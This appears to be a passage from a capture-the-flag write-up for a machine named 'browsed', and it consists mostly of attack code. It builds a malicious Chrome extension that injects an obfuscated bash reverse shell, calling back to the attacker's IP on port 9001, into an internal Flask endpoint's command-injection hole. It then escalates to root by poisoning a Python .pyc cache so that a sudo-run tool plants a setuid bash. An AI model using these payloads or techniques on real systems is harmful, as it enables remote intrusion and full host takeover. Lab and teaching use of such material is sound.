Malicious Chrome Extension

An internal Flask service on port 5000 exposes a /routines/ endpoint that passes the route parameter directly into a shell command. A URL like http://127.0.0.1:5000/routines/a[$(COMMAND)] executes arbitrary commands.

import zipfile, io, base64

my_ip = '10.10.X.X'
raw_shell = f'bash -i >& /dev/tcp/{my_ip}/9001 0>&1'
b64 = base64.b64encode(raw_shell.encode()).decode()
payload = f'echo${{IFS}}{b64}|base64${{IFS}}-d|bash'

manifest = '{"manifest_version":3,"name":"Optimizer","version":"1.1","background":{"service_worker":"background.js"},"host_permissions":["*://127.0.0.1/*"]}'
background = f'fetch(`http://127.0.0.1:5000/routines/a[$({payload})]`,{{mode:"no-cors"}});'

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('manifest.json', manifest)
    z.writestr('background.js', background)

Privilege Escalation — .pyc Cache Poisoning
larry@browsed:~$ sudo -l
(root) NOPASSWD: /opt/extensiontool/extension_tool.py

The tool imports extension_utils.py. Python validates bytecode cache only by file size and mtime — not content — so we can inject malicious bytecode that matches the original file's metadata.

import os, py_compile, shutil

ORIG = '/opt/extensiontool/extension_utils.py'
TARGET_PYC = '/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'
stat = os.stat(ORIG)

payload  = 'import os\n'
payload += 'def validate_manifest(p): os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"); return {}\n'
payload += 'def clean_temp_files(a): pass\n'
payload += '#' * (stat.st_size - len(payload))

open('/tmp/evil.py', 'w').write(payload)
os.utime('/tmp/evil.py', (stat.st_atime, stat.st_mtime))
py_compile.compile('/tmp/evil.py', cfile='/tmp/evil.pyc')
os.remove(TARGET_PYC)
shutil.copy('/tmp/evil.pyc', TARGET_PYC)
print('[+] Done')
